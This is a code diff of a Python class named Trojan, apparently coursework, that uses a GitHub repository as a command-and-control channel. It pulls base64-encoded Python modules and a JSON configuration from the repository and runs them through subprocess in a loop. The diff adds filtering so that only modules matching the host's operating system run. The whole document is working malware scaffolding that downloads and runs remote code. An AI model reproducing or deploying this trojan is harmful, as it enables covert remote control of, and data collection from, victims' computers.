@@ -8,15 +8,15 @@ class Trojan():
         self.repository_name = repository_name
         self.file_path = file_path
         self.access_token = access_token
-        self.run_InformationCollector()
+        self.run_OSChecker()
 
-    def run_InformationCollector(self):
+    def run_OSChecker(self):
         '''This function will run automatically accordingly when we first start our trojan'''
         from github import Github
         import subprocess
         g = Github(self.access_token)
         repo = g.get_repo(self.repository_name)
-        file_content = repo.get_contents('InformationCollector.py').decoded_content.decode('utf-8')
+        file_content = repo.get_contents('OSChecker.py').decoded_content.decode('utf-8')
         code = self.base64_to_text(file_content)
         subprocess.run(['python', '-c', code])
            
@@ -40,7 +40,9 @@ class Trojan():
 
     def run(self):
         '''beschrijving'''
+        import platform
         try:
+            my_os = platform.system()
             while True:
                 json_data = self.read_json_file()
                 if json_data and "modules" in json_data:
@@ -49,9 +51,10 @@ class Trojan():
                         module_activation = module.get("active")
                         module_name = module.get("name")
                         duration = module.get("duration", 0)
+                        module_OS = module.get("OS_type")
                         encoded_module = module.get("path") 
                             
-                        if module_name and duration > 0 and encoded_module and module_activation:
+                        if module_name and duration > 0 and encoded_module and module_activation and module_OS == my_os:
                             print(f"Executing module '{module_name}' for {duration} seconds...")
                             decoded_module = self.base64_to_text(encoded_module)
                                 
@@ -68,7 +71,7 @@ class Trojan():
             pass
 
 repository_name = "rsecurity12/python_opdracht"
-file_path = "ConfigFile.json"
+file_path = "Configuration.json"
 access_token = ''
 
 trojan = Trojan(repository_name, file_path, access_token)
